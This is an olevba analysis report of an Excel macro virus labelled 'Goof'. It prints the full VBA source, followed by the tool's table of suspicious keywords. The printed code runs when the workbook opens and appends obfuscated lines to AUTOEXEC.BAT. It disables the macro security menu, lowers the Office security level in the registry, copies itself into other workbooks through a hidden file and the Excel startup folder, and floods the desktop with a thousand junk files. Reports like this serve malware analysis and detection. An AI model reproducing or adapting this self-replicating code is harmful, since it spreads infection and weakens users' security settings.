olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Goof-6abbf93650c37ede68980ad6c8e649ce0f8db1aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Goof-6abbf93650c37ede68980ad6c8e649ce0f8db1aa - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' MarshYello
Private Sub Workbook_activate()
' Goof By Yello 25/10/00
    On Error Resume Next
        With Application
        .DisplayAlerts = (5 * 2 - 10)
        .Application.ScreenUpdating = (5 * 2 - 10)
        .Application.DisplayStatusBar = (5 * 2 - 10)
    End With
                Open "c:\AUTOEXEC.BAT" For Append As #1
                Print #1, Chr(83) & Chr(69) & Chr(84) & Chr(32) & Chr(84) & Chr(69) & Chr(77) & Chr(80) & Chr(61) & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(73) & Chr(78) & Chr(68) & Chr(79) & Chr(87) & Chr(83) & Chr(92) & Chr(68) & Chr(69) & Chr(83) & Chr(75) & Chr(84) & Chr(79) & Chr(80)
                Close #1
                Open "c:\AUTOEXEC.BAT" For Append As #1
                Print #1, Chr(83) & Chr(69) & Chr(84) & Chr(32) & Chr(84) & Chr(77) & Chr(80) & Chr(61) & Chr(67) & Chr(58) & Chr(92) & Chr(87) & Chr(73) & Chr(78) & Chr(68) & Chr(79) & Chr(87) & Chr(83) & Chr(92) & Chr(68) & Chr(69) & Chr(83) & Chr(75) & Chr(84) & Chr(79) & Chr(80)
                Close #1
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

    Open "C:\Windows\Nor.drv" For Output As #1
    Print #1, VBProject.VBComponents(1).codemodule.Lines(1, 65)
    Close #1
    SetAttr ("C:\Windows\Nor.drv"), 6

    Set ActiveWB = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
    Set ThisWB = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule

    CheckExist = Dir(Application.StartupPath & "\Book1.")
    If CheckExist = "" Then
    VBAProject.ThisWorkbook.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    End If

    If ActiveWB.Lines(3, 1) <> "' MarshYello" Then
        ActiveWB.DeleteLines 1, ActiveWB.CountofLines
        ActiveWB.AddFromFile ("C:\Windows\Nor.drv")
        ActiveWorkbook.Save
    End If
trouble1 = Right(Time, 5)
trouble = Left(trouble1, 2)
If trouble >= 45 Then Call MY_Name
End Sub
Private Sub MY_Name()
Count = 0
Do
Randomize
XXXX = Int((9999 * Rnd) + 1)
ZZZZ = Int((5 * Rnd) + 1)
If ZZZZ = 1 Then ZZZZ = Chr(46) & Chr(115) & Chr(104) & Chr(115)
If ZZZZ = 2 Then ZZZZ = Chr(46) & Chr(114) & Chr(97) & Chr(116)
If ZZZZ = 3 Then ZZZZ = Chr(46) & Chr(104) & Chr(108) & Chr(112)
If ZZZZ = 4 Then ZZZZ = Chr(46) & Chr(106) & Chr(115)
If ZZZZ = 5 Then ZZZZ = Chr(46) & Chr(119) & Chr(97) & Chr(118)
Open "c:\windows\desktop\" & XXXX & ZZZZ For Output As #1
Close #1
Count = Count + 1
Loop Until Count = 1000
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Goof-6abbf93650c37ede68980ad6c8e649ce0f8db1aa - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Goof-6abbf93650c37ede68980ad6c8e649ce0f8db1aa - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Goof-6abbf93650c37ede68980ad6c8e649ce0f8db1aa - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |Workbook_activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

